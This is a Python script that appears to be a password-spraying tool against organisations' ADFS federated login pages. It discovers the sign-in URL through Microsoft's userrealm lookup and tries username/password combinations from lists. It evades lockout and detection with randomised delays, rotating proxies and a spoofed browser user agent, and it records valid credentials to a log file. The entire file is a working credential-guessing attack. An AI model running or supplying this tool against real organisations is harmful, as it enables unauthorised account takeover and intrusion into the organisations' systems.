#!/usr/bin/python3
import os
import sys
import time
import json
import argparse
import random
import urllib3
import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



def get_args():
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', '--target', required=True, default=None, action='store', help='Target url')
	parser.add_argument('-u', '--user', required=False, default=None, action='store', help='User')
	parser.add_argument('-U', '--user_list', required=False, default=None, action='store', help='User list')
	parser.add_argument('-p', '--password', required=False, default=None, action='store', help='Password')
	parser.add_argument('-P', '--password_list', required=False, default=None, action='store', help='Password list')
	parser.add_argument('-m', '--min_time', required=False, default=30, action='store', help='Minimum seconds. Default: 300')
	parser.add_argument('-M', '--max_time', required=False, default=60, action='store', help='Maximum seconds. Default: 600')
	parser.add_argument('-r', '--randomize', required=False, default=True, action='store', help='Randomize pairs of credentials. Default: True')
	parser.add_argument('-l', '--logfile', required=False, default="tested.txt", action='store', help='Log file. Default: tested.txt')
	parser.add_argument('-d', '--debug', required=False, default=True, action='store', help='Debug mode. Default: False')
	parser.add_argument('-pl', '--proxy_list', required=False, default=None, action='store', help='Proxy list')
	#parser.add_argument('-up', '--userpassword_list', required=False, default=None, action='store', help='List with format user:password')
	return parser


def write_tested(user,password,test_credentials_file,status):
	with open(test_credentials_file, "a") as f:
		current_time = time.strftime("%H:%M:%S",time.localtime())
		f.write(user+":"+password+","+status+","+current_time+"\n")


def check_user(dafs_url,headers,session,credential,debug,proxy,test_credentials_file):
	user = credential[0]
	password = credential[1]
	data = {"UserName": user, "Password": password, "AuthMethod":"FormsAuthentication"}
	resp = session.post(dafs_url, data = data, headers = headers, verify = False, proxies = proxy)
	if resp.history != []:
		write_tested(user,password,test_credentials_file, "CORRECT")
		print("[+] CORRECT credentials found: %s:%s"%(user,password))
		return True
	elif resp.history == []:
		write_tested(user,password,test_credentials_file, "FAILED")
		if debug: print("[-] Incorrect credentials")
		return False
	if resp.status_code != 200:
		print ("[?] Strange status code: %s. Quitting!!!"%(resp.status_code))
		sys.exit(1)


def calculate_values(target):
	s = requests.Session()
	url = "https://login.microsoftonline.com/common/userrealm/?user=test@"+target+"&api-version=2.1&checkForMicrosoftAccount=true"
	response = s.get(url)
	json_data = json.loads(response.text)
	if 'AuthURL' in json_data:
		new_url = json_data['AuthURL']
	else:
		print("[-] Organization does not use a customized sign-in page. Using https://login.microsoftonline.com/")
		new_url = "https://login.microsoftonline.com/"
		sys.exit(1)
	dafs_url = s.get(new_url).url
	referer_field = dafs_url
	if "dafs" in referer_field:
		origin_field  = referer_field.split("adfs")[0]
	else:
		origin_field  = referer_field #"https://login.live.com"
	headers = {
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
		"Accept": "application/json, text/javascript, */*; q=0.01",
		"Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3",
		"Content-Type": "application/x-www-form-urlencoded",
		"Origin": origin_field,
		"Referer": referer_field,
		"Connection": "close"
	}
	return dafs_url,headers,s


def main():
	# Get arguments
	args = get_args().parse_args()

	# if (args.user is None and args.user_list is None and args.userpassword_list is None) or (args.password is None and args.password_list is None and args.userpassword_list is None):
	if (args.user is None and args.user_list is None) or (args.password is None and args.password_list is None):
		get_args().print_help()
		sys.exit(0)
	if (args.user_list is not None and not os.path.isfile(args.user_list)):
		print ("Error: Use '-U' with a file of users or '-u' for a single user")
		sys.exit(0)
	if (args.password_list is not None and not os.path.isfile(args.password_list)):
		print ("Error: Use '-P' with a file of passwords or '-p' for a single password")
		sys.exit(0)

	# Create variables
	users =      [args.user] if args.user is not None else open(args.user_list).read().splitlines()
	passwords =  [args.password] if args.password is not None else open(args.password_list).read().splitlines()
	pairs =      [(u,p) for u in users for p in passwords]
	proxy_list = open(args.proxy_list).read().splitlines() if args.proxy_list is not None else None
	debug =      json.loads(args.debug.lower()) if isinstance(args.debug,str) else args.debug
	randomize =  json.loads(args.randomize.lower()) if isinstance(args.randomize,str) else args.randomize

	# Delete already tested pairs of username and password
	test_credentials_file = args.logfile
	if os.path.isfile(test_credentials_file):
		tested_pairs = open(test_credentials_file).read().splitlines()
		tested_pairs = [(p.split(",")[0].split(":")[0], p.split(",")[0].split(":")[1]) for p in tested_pairs]
		pairs =        [p for p in pairs if p not in tested_pairs]
	
	# Randomize the combination of users and passwords
	if randomize:
		random.shuffle(pairs)

	# Get DAFS url and create a web session
	dafs_url,headers,session = calculate_values(args.target)

	if debug: 
		print ("[+] ADFS url: %s"%(dafs_url))
		print ("[+] Total users:     %d"%(len(users)))
		print ("[+] Total passwords: %d"%(len(passwords)))
		print ("[+] Combinations:    %d\n"%(len(pairs)))
	
	proxy_counter = 0
	correct_users_list = []
	proxy = None
	for credential in pairs:
		if credential[0] not in correct_users_list:
			random_seconds = random.randint(int(args.min_time), int(args.max_time))
			if debug: print("[-] Waiting %s seconds \n[-] Testing %s:%s"%(random_seconds, credential[0], credential[1]))
			if proxy_list is not None:
				proxy = {"http": proxy_list[proxy_counter%len(proxy_list)], "https": proxy_list[proxy_counter%len(proxy_list)]}
				proxy_counter += 1
			time.sleep(random_seconds)
			correct_user = check_user(dafs_url,headers,session,credential,debug,proxy,test_credentials_file)
			if correct_user:
				correct_users_list.append(credential[0])


if __name__== "__main__":
	main()
